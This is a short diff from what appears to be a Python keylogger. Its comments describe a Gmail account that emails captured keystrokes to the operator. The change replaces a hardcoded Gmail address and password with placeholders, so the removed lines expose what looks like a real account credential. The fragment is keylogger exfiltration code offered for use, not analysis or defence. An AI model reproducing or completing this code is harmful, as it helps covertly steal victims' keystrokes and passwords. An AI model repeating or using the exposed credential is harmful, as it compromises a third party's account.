@@ -59,8 +59,8 @@ def deliverMe(feedMe):
 
 	# Put your keylog bot's authentication details here
 	# This GMail account will send you the logged keystrokes
-	gmail_user = 'pyhannahmaple@gmail.com'  
-	gmail_password = 'Aquabat6464!~'
+	gmail_user = 'Gmail Username'  
+	gmail_password = 'Gmail Password'
 
 	sent_from = gmail_user  
 	# Put your receiving GMail address here!
